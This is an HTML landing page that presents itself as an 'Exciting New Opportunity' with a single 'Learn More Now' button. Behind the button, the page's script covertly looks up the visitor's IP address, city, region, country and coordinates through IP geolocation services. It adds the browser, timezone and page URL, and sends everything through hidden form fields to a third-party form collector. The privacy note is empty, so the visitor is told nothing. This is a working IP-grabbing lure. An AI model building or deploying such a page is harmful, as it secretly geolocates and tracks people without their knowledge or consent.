<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Learn More About Our Service</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #f0f2f5;
        }

        .container {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 15px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            max-width: 600px;
        }

        .learn-more-btn {
            background: #007bff;
            color: white;
            padding: 18px 36px;
            border: none;
            border-radius: 50px;
            font-size: 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .learn-more-btn:hover {
            background: #0056b3;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,123,255,0.4);
        }

        .learn-more-btn:active {
            transform: translateY(0);
        }

        .loading .learn-more-btn-text {
            visibility: hidden;
            opacity: 0;
        }

        .loading::after {
            content: "";
            position: absolute;
            width: 24px;
            height: 24px;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 4px solid transparent;
            border-top-color: #ffffff;
            border-radius: 50%;
            animation: button-loading-spinner 1s ease infinite;
        }

        @keyframes button-loading-spinner {
            from { transform: rotate(0turn); }
            to { transform: rotate(1turn); }
        }

        .alert {
            padding: 15px;
            margin-top: 20px;
            border-radius: 8px;
            display: none;
        }

        .alert-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .alert-error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .privacy-note {
            margin-top: 25px;
            font-size: 12px;
            color: #666;
            max-width: 400px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Exciting New Opportunity!</h1>
        <p>Discover how we can transform your experience</p>
        
        <form id="trackingForm" action="https://formbold.com/s/67pgd" method="POST">
            <!-- Hidden Tracking Fields -->
            <input type="hidden" name="user_ip" id="user_ip">
            <input type="hidden" name="user_location" id="user_location">
            <input type="hidden" name="user_agent" id="user_agent">
            <input type="hidden" name="page_url" id="page_url">
            <input type="hidden" name="timezone" id="timezone">
            <input type="hidden" name="coordinates" id="coordinates">
            
            <button type="submit" class="learn-more-btn" id="submitBtn">
                <span class="learn-more-btn-text">Learn More Now</span>
            </button>
        </form>

        <div id="alertBox" class="alert"></div>
        
        <p class="privacy-note">
        
        </p>
    </div>

    <script>
        const form = document.getElementById('trackingForm');
        const submitBtn = document.getElementById('submitBtn');
        const alertBox = document.getElementById('alertBox');

        async function getLocationData() {
            try {
                // First try ipinfo.io with token
                const response = await fetch('https://ipinfo.io/json?token=67b10842d76c29');
                if(response.ok) {
                    const data = await response.json();
                    return {
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country,
                        coords: data.loc
                    };
                }
            } catch (error) {
                console.log('Falling back to secondary API...');
                // Fallback to ipapi.co
                const fallbackResponse = await fetch('https://ipapi.co/json/');
                const fallbackData = await fallbackResponse.json();
                return {
                    ip: fallbackData.ip,
                    city: fallbackData.city,
                    region: fallbackData.region,
                    country: fallbackData.country_name,
                    coords: `${fallbackData.latitude},${fallbackData.longitude}`
                };
            }
        }

        async function handleSubmit(e) {
            e.preventDefault();
            submitBtn.classList.add('loading');
            
            try {
                // Collect tracking data
                const locationData = await getLocationData();
                
                document.getElementById('user_agent').value = navigator.userAgent;
                document.getElementById('page_url').value = window.location.href;
                document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
                document.getElementById('user_ip').value = locationData?.ip || 'unknown';
                document.getElementById('user_location').value = locationData ? 
                    `${locationData.city}, ${locationData.region}, ${locationData.country}` : 'unknown';
                document.getElementById('coordinates').value = locationData?.coords || 'unknown';

                // Submit form
                const response = await fetch(form.action, {
                    method: 'POST',
                    body: new FormData(form)
                });

                if(response.ok) {
                    showAlert('Thank you for your interest! We\'ll redirect you shortly...', 'success');
                    setTimeout(() => {
                        window.location.href = '/thank-you'; // Add your redirect URL
                    }, 2000);
                } else {
                    throw new Error('Submission failed');
                }
            } catch (error) {
                showAlert('Unable to process request. Please try again.', 'error');
            } finally {
                submitBtn.classList.remove('loading');
            }
        }

        function showAlert(message, type) {
            alertBox.textContent = message;
            alertBox.className = `alert alert-${type}`;
            alertBox.style.display = 'block';
            setTimeout(() => {
                alertBox.style.display = 'none';
            }, 5000);
        }

        form.addEventListener('submit', handleSubmit);
    </script>
</body>
</html>
